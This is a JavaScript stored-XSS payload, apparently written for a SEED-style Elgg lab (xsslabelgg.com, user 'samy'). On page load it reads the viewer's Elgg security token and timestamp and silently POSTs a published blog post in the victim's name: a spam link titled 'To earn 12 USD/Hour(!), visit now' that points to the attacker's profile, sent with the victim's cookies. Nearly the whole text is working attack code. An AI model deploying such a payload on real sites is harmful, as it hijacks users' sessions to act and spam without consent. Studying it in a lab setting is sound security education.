<script type="text/javascript">
    window.onload = function(){
    	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    	//and Security Token __elgg_token
    	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/blog/save"; //FILL IN


    //Referer: http://www.xsslabelgg.com/profile/alice/edit
    //var referer = "http://www.xsslabelgg.com/profile/" + elgg.session.user.name + "/edit";



    /*

    __elgg_token    O_nSUPIeaSUVKENf7qCPPg
__elgg_ts   1624270007
access_id   2
comments_on On
container_guid  47
description hii
excerpt 
guid    
save    Save
status  published
tags    
title   hw
	
    */

    var namee = elgg.session.user.name;

    var userid = elgg.session.user.owner_guid;

    var data = new FormData();
    data.append('__elgg_token', elgg.security.token.__elgg_token );
    data.append('__elgg_ts', elgg.security.token.__elgg_ts);

    data.append('access_id', 2);

    data.append('comments_on', 'On');


    data.append('container_guid', userid);

        //<p><a href="http://www.xsslabelgg.com/profile/samy">Earn Money</a></p>
        // add namee last to the profile link to make it dynamic

    var linkk = '<p><a+href="http://www.xsslabelgg.com/profile/samy">http://www.xsslabelgg.com/profile/samy</a></p>';

data.append('description', linkk);

data.append('excerpt', '');

//data.append('guid', elgg.session.user.guid);


data.append('save', 'Save');

data.append('status', 'published');

data.append('title', 'To earn 12 USD/Hour(!), visit now');

data.append('tags', '');


if (elgg.session.user.guid != elgg.page_owner.guid) {
    //Create and send Ajax request to modify profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    //Ajax.setRequestHeader("Referer",referer);
    Ajax.setRequestHeader("Cookie", document.cookie);

    Ajax.send(data);
    console.log('success');
}
    	}
    </script >